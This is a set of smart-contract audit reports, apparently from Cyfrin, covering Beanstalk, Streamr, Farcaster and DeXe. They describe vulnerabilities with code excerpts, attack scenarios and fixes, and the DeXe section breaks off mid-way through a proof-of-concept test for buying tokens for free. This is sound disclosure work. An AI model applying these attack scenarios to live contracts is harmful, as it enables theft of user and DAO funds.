`MetadataImage::sciNotation` is intended to convert an input Stem to its string representation, using scientific notation if the value is [greater than 1e5](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L539). Related comments [referencing 1e7](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L538) as the threshold are incorrect and so should be modified to 1e5.

**Beanstalk Farms:** Fixed in commit [81e452e](https://github.com/BeanstalkFarms/Beanstalk/commit/81e452e41c2533dfc49543dc70fba15ed3c6cc2f).

**Cyfrin:** Acknowledged.

### Continued reference to "Seeds" in `InitBipBasinIntegration::init` is confusing
With the deprecation of the "Seeds" terminology, [continued reference](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/init/InitBipBasinIntegration.sol#L31-L33) is confusing and all instances should be updated to instead refer to the earned Stalk per BDV per Season.

**Beanstalk Farms:** Updated names in commit [ba1d42b](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/ba1d42bc9159881143c5f23ab03a7ba8078bd4b0).

### `InitBipBasinIntegration` NatSpec title tag is inconsistent with the file/contract name
The [title tag](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/init/InitBipBasinIntegration.sol#L17) of the `InitBipBasinIntegration` NatSpec is inconsistent with the file/contract name and should be updated to match.

**Beanstalk Farms:** Fixed in commit [c03f635](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/c03f635ef655eb80a2f6a270c41f19bcbd4a66ad).

**Cyfrin:** Acknowledged.

### Conditional block in `WellPrice::getConstantProductWell` can be removed
The [else block](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/ecosystem/price/WellPrice.sol#L64-L67) in `WellPrice::getConstantProductWell`, which handles the case when it is not possible to determine a price for Bean, is not necessary and can be removed as the default value of the `pool.price` is already zero.

**Beanstalk Farms:** Removed in commit [8aae31d](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/8aae31d683aeec50ccbc17985701b46223cc0a1d).

**Cyfrin:** Acknowledged.

### Unsafe cast in `WellPrice::getDeltaB`
While not likely to overflow, there is an [unsafe cast](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/ecosystem/price/WellPrice.sol#L97) in `WellPrice::getDeltaB` which could be replaced with a safe cast.

**Beanstalk Farms:** Fixed in commit [ff742a6](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/ff742a6f5b0b166df988a2422e475d314b948fc9).

### Typo in `FertilizerFacet::getMintFertilizerOut` NatSpec
The NatSpec of [`FertilizerFacet::getMintFertilizerOut`](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/beanstalk/barn/FertilizerFacet.sol#L108) currently refers to Fertilizer as `Fertilize` which should be corrected.

**Beanstalk Farms:** Fixed in commit [373c094](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/373c0948cce9730446111a943a4fd96dabd90025).

**Cyfrin:** Acknowledged.

### Typo in comment within `LibSilo::_mow`
The following [typo](https://github.com/BeanstalkFarms/Beanstalk/blob/12c608a22535e3a1fe379db1153185fe43851ea7/protocol/contracts/libraries/Silo/LibSilo.sol#L351-L352) in `LibSilo::_mow` should be corrected:

```diff
- //sop stuff only needs to be updated once per season
- //if it started raininga nd it's still raining, or there was a sop
+ // sop stuff only needs to be updated once per season
+ // if it started raining and it's still raining, or there was a sop
```

**Beanstalk Farms:** Fixed in commit [d27567c](https://github.com/BeanstalkFarms/Beanstalk/pull/655/commits/d27567c5f84bf07d604397f4d4549570ac9fb8c4).

**Cyfrin:** Acknowledged.

------ FILE END car/reports_md/2023-10-13-cyfrin-beanstalk-bip-38.md ------


------ FILE START car/reports_md/2023-11-03-cyfrin-streamr-v2.0.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

---

# Findings
## High Risk


### `VoteKickPolicy._endVote()` might revert forever due to underflow

**Severity:** High

**Description:** In `onFlag()`, `targetStakeAtRiskWei[target]` might be less than the total rewards for the flagger/reviewers due to rounding.

```solidity
File: contracts\OperatorTokenomics\StreamrConfig.sol
22:     /**
23:      * Minimum amount to pay reviewers+flagger
24:      * That is: minimumStakeWei >= (flaggerRewardWei + flagReviewerCount * flagReviewerRewardWei) / slashingFraction
25:      */
26:     function minimumStakeWei() public view returns (uint) {
27:         return (flaggerRewardWei + flagReviewerCount * flagReviewerRewardWei) * 1 ether / slashingFraction;
28:     }
```

- Let's assume `flaggerRewardWei + flagReviewerCount * flagReviewerRewardWei = 100, StreamrConfig.slashingFraction = 0.03e18(3%), minimumStakeWei() = 1000 * 1e18 / 0.03e18 = 10000 / 3 = 3333.`
- If we suppose `stakedWei[target] = streamrConfig.minimumStakeWei()`, then `targetStakeAtRiskWei[target] = 3333 * 0.03e18 / 1e18 = 99.99 = 99.`
- As a result, `targetStakeAtRiskWei[target]` is less than total rewards(=100), and `_endVote()` will revert during the reward distribution due to underflow.

The above scenario is possible only when there is a rounding during `minimumStakeWei` calculation. So it works properly with the default `slashingFraction = 10%`.

**Impact:** The `VoteKickPolicy` wouldn't work as expected and malicious operators won't be kicked forever.

**Recommended Mitigation:** Always round the `minimumStakeWei()` up.

**Client:** Fixed in commit [615b531](https://github.com/streamr-dev/network-contracts/commit/615b5311963082c79d05ec4072b1abeba4d1f9b4).

**Cyfrin:** Verified.

### Possible overflow in `_payOutFirstInQueue`

**Severity:** High

**Description:** In `_payOutFirstInQueue()`, possible revert during `operatorTokenToDataInverse()`.

```solidity
uint amountOperatorTokens = moduleCall(address(exchangeRatePolicy), abi.encodeWithSelector(exchangeRatePolicy.operatorTokenToDataInverse.selector, amountDataWei));
```

If a delegator calls `undelegate()` with `type(uint256).max`, `operatorTokenToDataInverse()` will revert due to uint overflow and the queue logic will be broken forever.

```solidity
   function operatorTokenToDataInverse(uint dataWei) external view returns (uint operatorTokenWei) {
       return dataWei * this.totalSupply() / valueWithoutEarnings();
   }
```

**Impact:** The queue logic will be broken forever because `_payOutFirstInQueue()` keeps reverting.

**Recommended Mitigation:** We should cap `amountDataWei` before calling `operatorTokenToDataInverse()`.

**Client:** Fixed in commit [c62e5d9](https://github.com/streamr-dev/network-contracts/commit/c62e5d90ce8f8c084fe3917f499c967c85a3873b).

**Cyfrin:** Verified.

### Wrong validation in `DefaultUndelegationPolicy.onUndelegate()`

**Severity:** High

**Description:** In `onUndelegate()`, it checks if the operator owner still holds at least `minimumSelfDelegationFraction` of total supply.

```solidity
   function onUndelegate(address delegator, uint amount) external {
       // limitation only applies to the operator, others can always undelegate
       if (delegator != owner) { return; }

       uint actualAmount = amount < balanceOf(owner) ? amount : balanceOf(owner); //@audit amount:DATA, balanceOf:Operator
       uint balanceAfter = balanceOf(owner) - actualAmount;
       uint totalSupplyAfter = totalSupply() - actualAmount;
       require(1 ether * balanceAfter >= totalSupplyAfter * streamrConfig.minimumSelfDelegationFraction(), "error_selfDelegationTooLow");
   }
```

But `amount` means the DATA token amount and `balanceOf(owner)` indicates the `Operator` token balance and it's impossible to compare them directly.

**Impact:** The operator owner wouldn't be able to undelegate because `onUndelegate()` works unexpectedly.

**Recommended Mitigation:** `onUndelegate()` should compare amounts after converting to the same token.

**Client:** Fixed in commit [9b8c65e](https://github.com/streamr-dev/network-contracts/commit/9b8c65ea31b6bf15fe4ec913a975782f27c0c9a0).

**Cyfrin:** Verified.

### Malicious target can make `_endVote()` revert forever by forceUnstaking/staking again

**Severity:** High

**Description:** In `_endVote()`, we update `forfeitedStakeWei` or `lockedStakeWei[target]` according to the `target`'s staking status.

```solidity
File: contracts\OperatorTokenomics\SponsorshipPolicies\VoteKickPolicy.sol
179:     function _endVote(address target) internal {
180:         address flagger = flaggerAddress[target];
181:         bool flaggerIsGone = stakedWei[flagger] == 0;
182:         bool targetIsGone = stakedWei[target] == 0;
183:         uint reviewerCount = reviewers[target].length;
184:
185:         // release stake locks before vote resolution so that slashings and kickings during resolution aren't affected
186:         // if either the flagger or the target has forceUnstaked or been kicked, the lockedStakeWei was moved to forfeitedStakeWei
187:         if (flaggerIsGone) {
188:             forfeitedStakeWei -= flagStakeWei[target];
189:         } else {
190:             lockedStakeWei[flagger] -= flagStakeWei[target];
191:         }
192:         if (targetIsGone) {
193:             forfeitedStakeWei -= targetStakeAtRiskWei[target];
194:         } else {
195:             lockedStakeWei[target] -= targetStakeAtRiskWei[target]; //@audit revert after forceUnstake() => stake() again
196:         }
```

We consider the target is still active if he has a positive staking amount. But we don't know if he has unstaked and staked again, so the below scenario would be possible.

- The target staked 100 amount and a flagger reported him.
- In `onFlag()`, `lockedStakeWei[target] = targetStakeAtRiskWei[target] = 100`.
- During the voting period, the target called `forceUnstake()`. Then `lockedStakeWei[target]` was reset to 0 in `Sponsorship._removeOperator()`.
- After that, he stakes again and `_endVote()` will revert forever at L195 due to underflow.

After all, he won't be flagged again because the current flagging won't be finalized.

Furthermore, malicious operators would manipulate the above state by themselves to earn operator rewards without any risks.

**Impact:** Malicious operators can bypass the flagging system by reverting `_endVote()` forever.

**Recommended Mitigation:** Perform stake unlocks in `_endVote()` without relying on the current staking amounts.

**Client:** Fixed in commit [8be1d7e](https://github.com/streamr-dev/network-contracts/commit/8be1d7e3ded2d595eaaa16ddd4474d3a8d31bfbe).

**Cyfrin:** Verified.

## Medium Risk


### In `VoteKickPolicy.onFlag()`, `targetStakeAtRiskWei[target]` might be greater than `stakedWei[target]` and `_endVote()` would revert.

**Severity:** Medium

**Description:** `targetStakeAtRiskWei[target]` might be greater than `stakedWei[target]` in `onFlag()`.

```solidity
targetStakeAtRiskWei[target] = max(stakedWei[target], streamrConfig.minimumStakeWei()) * streamrConfig.slashingFraction() / 1 ether;
```

For example,
- At the first time, `streamrConfig.minimumStakeWei() = 100` and an operator(=target) has staked 100.
- `streamrConfig.minimumStakeWei()` was increased to 2000 after a reconfiguration.
- `onFlag()` is called for target and `targetStakeAtRiskWei[target]` will be `max(100, 2000) * 10% = 200`.
- In `_endVote()`, `slashingWei = _kick(target, slashingWei)` will be 100 because target has staked 100 only.
- So it will revert due to underflow during the reward distribution.

**Impact:** Operators with small staked funds wouldn't be kicked forever.

**Recommended Mitigation:** `onFlag()` should check if a target has staked enough funds for rewards and handle separately if not.

**Client:** Fixed in commit [05d9716](https://github.com/streamr-dev/network-contracts/commit/05d9716b8e19668fea70959327ab8e896ab0645d). Flag targets with not enough stake (to pay for the review) will be kicked out without review. Since this can only happen after the admin changes the minimum stake requirement (e.g. by increasing reviewer rewards), the flag target is not at fault and will not be slashed. They can stake back again with the new minimum stake if they want.

**Cyfrin:** Verified.

### Possible front running of `flag()`

**Severity:** Medium

**Description:** The `target` might call `unstake()/forceUnstake()` before a flagger calls `flag()` to avoid a possible fund loss. Also, there would be no slash during the unstaking for `target` when it meets the `penaltyPeriodSeconds` requirement.

```solidity
File: contracts\OperatorTokenomics\SponsorshipPolicies\VoteKickPolicy.sol
65:     function onFlag(address target, address flagger) external {
66:         require(flagger != target, "error_cannotFlagSelf");
67:         require(voteStartTimestamp[target] == 0 && block.timestamp > protectionEndTimestamp[target], "error_cannotFlagAgain"); // solhint-disable-line not-rely-on-time
68:         require(stakedWei[flagger] >= minimumStakeOf(flagger), "error_notEnoughStake");
69:         require(stakedWei[target] > 0, "error_flagTargetNotStaked"); //@audit possible front run
70:
```

**Impact:** A malicious target would bypass the kick policy by front running.

**Recommended Mitigation:** There is no straightforward mitigation but we could implement a kind of `delayed unstaking` logic for some percent of staking funds.

**Client:** Our current threat model is a staker who doesn't run a Streamr node. They could be a person using Metamask to do all smart contract transactions via our UI, or they could be a complex flashbot MEV searcher. But if they're not running Streamr nodes, they should be found out, flagged, and kicked out by the honest nodes.

While an advanced bot could stake and listen to `Flagged` events, if they're found out and flagged before their minimum stay (`DefaultLeavePolicy.penaltyPeriodSeconds`) is over, their stake would still get slashed even if they front-run the flagging. We aim to select our network parameters so that it will be very likely that someone staking but not actually running a Streamr node would get flagged during those `penaltyPeriodSeconds`. Then front-running the flagging wouldn't save them from slashing.

**Cyfrin:** Acknowledged.

### Operators can bypass a `leavePenalty` using `reduceStakeTo()`

**Severity:** Medium

**Description:** Operators should pay a leave penalty when they unstake earlier than expected.
But there are no relevant requirements in `reduceStakeTo()` so they can reduce their staking amount to the minimum value.

- An operator staked 100 and he wants to unstake earlier.
- When he calls `forceUnstake()`, he should pay `100 * 10% = 10` as a penalty.
- But if he reduces the staking amount to the minimum(like 10) using `reduceStakeTo()` first and calls `forceUnstake()`, the penalty will be `10 * 10% = 1.`

**Impact:** Operators will pay a `leavePenalty` for the minimum amount only.

**Recommended Mitigation:** The penalty should be the same, whether an Operator only calls `forceUnstake`, or first calls `reduceStakeTo`.

**Client:** Fixed in commit [72323d0](https://github.com/streamr-dev/network-contracts/commit/72323d0099a85c8c7a5d59335492eebcc9cc66bb).

**Cyfrin:** Verified

### In `Operator._transfer()`, `onDelegate()` should be called after updating the token balances

**Severity:** Medium

**Description:** In `_transfer()`, `onDelegate()` is called to validate the owner's `minimumSelfDelegationFraction` requirement.

```solidity
File: contracts\OperatorTokenomics\Operator.sol
324:         // transfer creates a new delegator: check if the delegation policy allows this "delegation"
325:         if (balanceOf(to) == 0) {
326:             if (address(delegationPolicy) != address(0)) {
327:                 moduleCall(address(delegationPolicy), abi.encodeWithSelector(delegationPolicy.onDelegate.selector, to)); //@audit
should be called after _transfer()
328:             }
329:         }
330:
331:         super._transfer(from, to, amount);
332:
```

But `onDelegate()` is called before updating the token balances and the below scenario would be possible.

- The operator owner has 100 shares(required minimum fraction). And there are no undelegation policies.
- Logically, the owner shouldn't be able to transfer his 100 shares to a new delegator due to the min fraction requirement in `onDelegate()`.
- But if the owner calls `transfer(owner, to, 100)`, `balanceOf(owner)` will be 100 in `onDelegation()` and it will pass the requirement because it's called before `super._transfer()`.

**Impact:** The operator owner might transfer his shares to other delegators in anticipation of slashing, to avoid slashing.

**Recommended Mitigation:** `onDelegate()` should be called after `super._transfer()`.

**Client:** Fixed in commit [93d6105](https://github.com/streamr-dev/network-contracts/commit/93d610561c109058c967d1d2f49ea91811f28579).

**Cyfrin:** Verified.

### Centralization risk

**Severity:** Medium

**Description:** The protocol has a `DEFAULT_ADMIN_ROLE` with privileged rights to perform admin tasks that can affect users. Especially, the owner can change the fee/reward fraction settings and various policies.

Most admin functions don't emit events at the moment.

**Impact:** While the protocol owner is regarded as a trusted party, the owner can change many settings and policies without logging. This might lead to unexpected results and users might be affected.

**Recommended Mitigation:** Specify the owner's privileges and responsibilities in the documentation.
Add constant state variables that can be used as the minimum and maximum values for the fraction settings.
Log the changes in the important state variables via events.

**Client:** Logging added to StreamrConfig in commit [c530ec5](https://github.com/streamr-dev/network-contracts/commit/c530ec5092c1d6567357ef9993a0f029f113a0d8). Better documentation and more logging added to other contracts in commit [c343850](https://github.com/streamr-dev/network-contracts/commit/c343850136a97573349d7cb226733c9fd5729eb6). Those commits partially mitigate risks associated with leaking of the admin key.

In StreamrConfig, there isn't much difference in the power to change the config values, and in replacing the whole contract (it's upgradeable). Some maximum and minimum limits exist currently, but their main point is to sanity-check new values, especially the initial values. "Binding our hands" with tighter limits wouldn't thus really change anything, at best it would signal an intent.

Before using these admin powers to change config values or amend the contracts using upgrades, wider review (community, auditors) will be needed, to avoid unexpected side-effects that may affect users. The day-to-day is not designed to require any admin intervention. Admin powers are only needed for unforeseen circumstances (e.g. hotfixing bugs) or planned policy changes. There is no foreseeable need for such changes at the moment.

**Cyfrin:** Acknowledged.

### `onTokenTransfer` does not validate if the call is from the DATA token contract

**Severity:** Medium

**Description:** `SponsorshipFactory::onTokenTransfer` and `OperatorFactory::onTokenTransfer` are used to handle the token transfer and contract deployment in a single transaction. But there is no validation that the call is from the DATA token contract and anyone can call these functions.

The impact is low for `Sponsorship` deployment, but for `Operator` deployment, `ClonesUpgradeable.cloneDeterministic` is used with a salt based on the operator token name and the operator address. An attacker can abuse this to cause DoS for deployment.

We see that this validation is implemented correctly in other contracts like `Operator`.
```solidity
       if (msg.sender != address(token)) {
           revert AccessDeniedDATATokenOnly();
       }
```

**Impact:** Attackers can prevent the deployment of `Operator` contracts.

**Recommended Mitigation:** Add a validation to ensure the caller is the actual DATA contract.

**Client:** Fixed in commit [8b13df4](https://github.com/streamr-dev/network-contracts/commit/8b13df49900c640df51e22f7c5a78fcad761f7cb).

**Cyfrin:** Verified.

## Low Risk

### Unsafe use of `transfer()/transferFrom()` with `IERC20`
Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT)'s `transfer()` and `transferFrom()` functions on L1 do not return booleans as the specification requires, and instead have no return value. Consider using OpenZeppelins `SafeERC20`'s `safeTransfer()/safeTransferFrom()` instead

```solidity
File: contracts\OperatorTokenomics\Operator.sol
264:         token.transferFrom(_msgSender(), address(this), amountWei);
442:         token.transfer(msgSender, rewardDataWei);

File: contracts\OperatorTokenomics\Sponsorship.sol
187:         token.transferFrom(_msgSender(), address(this), amountWei);
215:         token.transferFrom(_msgSender(), address(this), amountWei);
261:         token.transfer(streamrConfig.protocolFeeBeneficiary(), slashedWei);
273:         token.transfer(operator, payoutWei);

File: contracts\OperatorTokenomics\OperatorPolicies\QueueModule.sol
86:           token.transfer(delegator, amountDataWei);

File: contracts\OperatorTokenomics\OperatorPolicies\StakeModule.sol
128:         token.transfer(streamrConfig.protocolFeeBeneficiary(), protocolFee);
```

**Client:** We will only use DATA token in our system. It doesn't have the above methods. So: `transfer` it is.

**Cyfrin:** Acknowledged.

## Informational Findings

### Redundant requirement
The first requirement is redundant because the second one is enough.

```solidity
File: contracts\OperatorTokenomics\SponsorshipPolicies\VoteKickPolicy.sol
156:         require(reviewerState[target][voter] != Reviewer.NOT_SELECTED, "error_reviewersOnly"); //@audit-issue redundant
157:         require(reviewerState[target][voter] == Reviewer.IS_SELECTED, "error_alreadyVoted");
```

**Client:** We want to give an informative error message for the case where a non-reviewer tries to vote. So: prefer to keep it.

**Cyfrin:** Acknowledged.

### Variables need not be initialized to zero
The default value for variables is zero, so initializing them to zero is redundant.

```solidity
File: contracts\OperatorTokenomics\SponsorshipPolicies\DefaultLeavePolicy.sol
10:           uint public penaltyPeriodSeconds = 0;

File: contracts\OperatorTokenomics\SponsorshipPolicies\VoteKickPolicy.sol
100:         uint sameSponsorshipPeerCount = 0;
226:         uint rewardsWei = 0;
```

**Client:** Fixed in commit [c847fab](https://github.com/streamr-dev/network-contracts/commit/c847fab3e57f1f2dc3aa26e8cb79d44c8ed86f5e).

**Cyfrin:** Verified.

### Event is not properly `indexed`
Index event fields make the field more quickly accessible to off-chain tools that parse events. This is especially useful when it comes to filtering based on an address. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Where applicable, each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three applicable fields, all of the applicable fields should be indexed.


**Client:** Fixed in commit [92d4145](https://github.com/streamr-dev/network-contracts/commit/92d4145aaf6f56c3e9c72b4f9ef53a89e67aa36e).

**Cyfrin:** Verified.

------ FILE END car/reports_md/2023-11-03-cyfrin-streamr-v2.0.md ------


------ FILE START car/reports_md/2023-11-05-cyfrin-farcaster-v1.0.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)
**Assisting Auditors**




---

# Findings

## Medium Risk

### A signer can't cancel his signature before a deadline.

**Severity:** Medium

**Description:** After signing a signature, a signer might want to cancel it for some reason. While checking other protocols, a signer can cancel by increasing his nonce.
In this protocol, we inherit from OpenZeppelin's [Nonces](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Nonces.sol) contract and there are no ways to cancel the signature before a deadline.

**Impact:** Signers can't invalidate their signatures when they want.

**Recommended Mitigation:** Recommend adding a function like `increaseNonce()` to invalidate the past signatures.

**Client:**
Fixed by adding a base `Nonces` contract that exposes an external `useNonce()` function, enabling the caller to increment
their nonce. Commit: [`0189a1f`](https://github.com/farcasterxyz/farcaster-contracts-private/commit/0189a1fd308a5976ecdfbce2765b6d7a953eb80f)

**Cyfrin:** Verified.

### In `IdRegistry`, a recovery address might be updated unexpectedly.

**Severity:** Medium

**Description:** There are 2 functions to update a recovery address, `changeRecoveryAddress()` and `changeRecoveryAddressFor()`.
As `changeRecoveryAddress()` doesn't reset a pending signature that would be used in `changeRecoveryAddressFor()`, the below scenario would be possible.

- Alice decided to set a recovery as Bob and created a signature for that.
- But before calling `changeRecoveryAddressFor()`, Alice noticed Bob was not a perfect fit and changed the recovery address to another one by calling `changeRecoveryAddress()` directly.
- But Bob or anyone calls `changeRecoveryAddressFor()` after that and Bob can change the owner as well.

Of course, Alice could delete the signature by increasing her nonce but it's not a good approach for users to be allowed to use the previous signature.

**Impact:** A recovery address might be updated unexpectedly.

**Recommended Mitigation:** We should include the current recovery address in the recovery signature.
Then the previous signature will be invalidated automatically after changing the recovery.

**Client:**
Fixed by adding the current recovery address to `CHANGE_RECOVERY_ADDRESS_TYPEHASH`. Commit: [`7826446`](https://github.com/farcasterxyz/farcaster-contracts-private/commit/7826446c172d2038ab7b3eeb3073c3a7233061df)

**Cyfrin:** Verified.

### `IdRegistry.transfer/transferFor()` might be revoked by a recovery address.

**Severity:** Medium

**Description:** In every `fid`, there exists an owner and a recovery address, each possessing identical authority, enabling either one to modify the other.
But while transferring the `fid`, it just changes the owner and this scenario might be possible.

- Consider Bob with a `fid(owner, recovery)` intending to sell it.
- After receiving some funds, he transfers his `fid` to an honest user using `transfer()`.
- When the honest user is going to update the recovery address, Bob calls `recover()` by front running and seizes the account.
- In contrast to ERC721, a recovery address acts like an approved user for the NFT, empowered to change ownership at any moment. Notably, this authority is cleared during the [transfer](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L252) to prevent subsequent updates by any prior approvals.

**Impact:** `IdRegistry.transfer/transferFor()` might be revoked by a recovery address.

**Recommended Mitigation:** Recommend adding a function like `transferAll()` to update both `owner/recovery`.

**Client:**
Fixed by adding `transferAndChangeRecovery` and `transferAndChangeRecoveryFor` to `IdRegistry`. Commit: [`d389f9f`](https://github.com/farcasterxyz/farcaster-contracts-private/commit/d389f9f9e102ea1706f115b0aba2c7e429ba3e9a)

**Cyfrin:** Verified.

### A removal signature might be applied to the wrong `fid`.

**Severity:** Medium

**Description:** A remove signature is used to remove a key from `fidOwner` using `KeyRegistry.removeFor()`. And the signature is verified in `_verifyRemoveSig()`.

```solidity
    function _verifyRemoveSig(address fidOwner, bytes memory key, uint256 deadline, bytes memory sig) internal {
        _verifySig(
            _hashTypedDataV4(
                keccak256(abi.encode(REMOVE_TYPEHASH, fidOwner, keccak256(key), _useNonce(fidOwner), deadline))
            ),
            fidOwner,
            deadline,
            sig
        );
    }
```

But the signature doesn't specify a `fid` to remove and the below scenario would be possible.

- Alice is an owner of `fid1` and she created a removal signature to remove a `key` but it's not used yet.
- For various reasons, she became an owner of `fid2`.
- `fid2` has a `key` also but she doesn't want to remove it.
- But if anyone calls `removeFor()` with her previous signature, the `key` will be removed from `fid2` unexpectedly.

Once a key is removed, `KeyState` will be changed to `REMOVED` and anyone including the owner can't retrieve it.

**Impact:** A key remove signature might be used for an unexpected `fid`.

**Recommended Mitigation:** The removal signature should contain `fid` also to be invalidated for another `fid`.

**Client:**
Acknowledged. This is an intentional design tradeoff that makes it possible to register a fid and add a key in a single transaction, without knowing the caller's assigned fid in advance. We accept that this has the consequence described in the finding, and users should interpret key registry actions as add key to currently owned fid.

Nonces provide some protection against this scenario: if Alice wants to revoke her previous signature intended for `fid1`, she can increment her nonce to invalidate the signature.

**Cyfrin:** Acknowledged.

## Low Risk

### Inconsistent validation of `vaultAddr`

In `KeyManager.setVault()` and `StorageRegistry.setVault()`, there is a validation for address(0) but we don't check in the constructors.

```solidity
File: audit-farcaster\src\KeyManager.sol
123:         vault = _initialVault;
124:         emit SetVault(address(0), _initialVault);
...
211:     function setVault(address vaultAddr) external onlyOwner {
212:         if (vaultAddr == address(0)) revert InvalidAddress();
213:         emit SetVault(vault, vaultAddr);
214:         vault = vaultAddr;
215:     }
216:
```

**Client:**
After internal discussion, weve decided to remove payments from the `KeyGateway` altogether and rely on per-fid limits in the `KeyRegistry` for now. Were keeping the gateway pattern in place, which gives us the ability to introduce a payment in the future if it becomes necessary.

We don't intend to redeploy the StorageRegistry with this deployment, but we will add this validation in the next version of the storage contract.

Commit: [`11e2722`](https://github.com/farcasterxyz/farcaster-contracts-private/commit/11e27223625e4c6b5f929398e015ccda740c1593)

**Cyfrin:** Acknowledged.

### Lack of validations for some admin functions

In `KeyManager.setUsdFee()` and `StorageRegistry.setPrice()`, there are no upper limits.

While the protocol owner is regarded as a trusted party, it's still kind of an inconsistent implementation because there are min/max limits for `fixedEthUsdPrice` in `StorageRegistry.setFixedEthUsdPrice()`.

```solidity
File: audit-farcaster\src\KeyManager.sol
203:     function setUsdFee(uint256 _usdFee) external onlyOwner {
204:         emit SetUsdFee(usdFee, _usdFee);
205:         usdFee = _usdFee;
206:     }

File: audit-farcaster\src\StorageRegistry.sol
716:     function setPrice(uint256 usdPrice) external onlyOwner {
717:         emit SetPrice(usdUnitPrice, usdPrice);
718:         usdUnitPrice = usdPrice;
719:     }
```

**Client:**
After internal discussion, weve decided to remove payments from the `KeyGateway` altogether. (See the response to 7.2.1 for more details).

We don't intend to redeploy the StorageRegistry with this deployment, but we will add this validation in the next version of the storage contract.

Commit: [`11e2722`](https://github.com/farcasterxyz/farcaster-contracts-private/commit/11e27223625e4c6b5f929398e015ccda740c1593)

**Cyfrin:** Acknowledged.

------ FILE END car/reports_md/2023-11-05-cyfrin-farcaster-v1.0.md ------


------ FILE START car/reports_md/2023-11-10-cyfrin-dexe.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Dacian](https://twitter.com/@DevDacian)


---

# Findings
## Critical Risk


### `TokenSaleProposal::buy` implicitly assumes that buy token has 18 decimals resulting in a potential total loss scenario for Dao Pool

**Description:** `TokenSaleProposalBuy::buy` is called by users looking to buy the DAO token using a pre-approved token. The exchange rate for this sale is pre-assigned for the specific tier. This function internally calls `TokenSaleProposalBuy::_purchaseWithCommission` to transfer funds from the buyer to the gov pool. Part of the transferred funds are used to pay the DexeDAO commission and balance funds are transferred to the `GovPool` address. To do this, `TokenSaleProposalBuy::_sendFunds` is called.

```solidity
    function _sendFunds(address token, address to, uint256 amount) internal {
        if (token == ETHEREUM_ADDRESS) {
            (bool success, ) = to.call{value: amount}("");
            require(success, "TSP: failed to transfer ether");
        } else {
  >>          IERC20(token).safeTransferFrom(msg.sender, to, amount.from18(token.decimals())); //@audit -> amount is assumed to be 18 decimals
        }
    }
```

Note that this function assumes that the `amount` of ERC20 token is always 18 decimals. The `DecimalsConverter::from18` function converts from a base decimal (18) to token decimals. Note that the amount is directly passed by the buyer and there is no prior normalisation done to ensure the token decimals are converted to 18 decimals before the `_sendFunds` is called.


**Impact:** It is easy to see that for tokens with smaller decimals, eg. USDC with 6 decimals, will cause a total loss to the DAO. In such cases amount is presumed to be 18 decimals & on converting to token decimals(6), this number can round down to 0.

**Proof of Concept:**
- Tier 1 allows users to buy DAO token at exchange rate, 1 DAO token = 1 USDC.
-  User intends to buy 1000 Dao Tokens and calls `TokenSaleProposal::buy` with `buy(1, USDC, 1000*10**6)
- Dexe DAO Comission is assumed 0% for simplicity- > `sendFunds` is called with `sendFunds(USDC, govPool, 1000* 10**6)`
- `DecimalConverter::from18` function is called on amount with base decimals 18, destination decimals 6:  `from18(1000*10**6, 18, 6)`
- this gives `1000*10**6/10*(18-6) = 1000/ 10**6` which rounds to 0

Buyer can claim 1000 DAO tokens for free. This is a total loss to the DAO.

Add PoC to `TokenSaleProposal.test.js`:

First add a new line around [L76](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L76) to add new `purchaseToken3`:
```javascript
      let purchaseToken3;
```

Then add a new line around [L528](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L528):
```javascript
      purchaseToken3 = await ERC20Mock.new("PurchaseMockedToken3", "PMT3", 6);
```

Then add a new tier around [L712](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L712):
```javascript
        {
          metadata: {
            name: "tier 9",
            description: "the ninth tier",
          },
          totalTokenProvided: wei(1000),
          saleStartTime: timeNow.toString(),
          saleEndTime: (timeNow + 10000).toString(),
          claimLockDuration: "0",
          saleTokenAddress: saleToken.address,
          purchaseTokenAddresses: [purchaseToken3.address],
          exchangeRates: [PRECISION.times(1).toFixed()],
          minAllocationPerUser: 0,
          maxAllocationPerUser: 0,
          vestingSettings: {
            vestingPercentage: "0",
            vestingDuration: "0",
            cliffPeriod: "0",
            unlockStep: "0",
          },
          participationDetails: [],
        },
```

Then add the test itself under the section `describe("if added to whitelist", () => {`:
```javascript
          it("audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO", async () => {
            await purchaseToken3.approve(tsp.address, wei(1000));

            // tier9 has the following parameters:
            // totalTokenProvided   : wei(1000)
            // minAllocationPerUser : 0 (no min)
            // maxAllocationPerUser : 0 (no max)
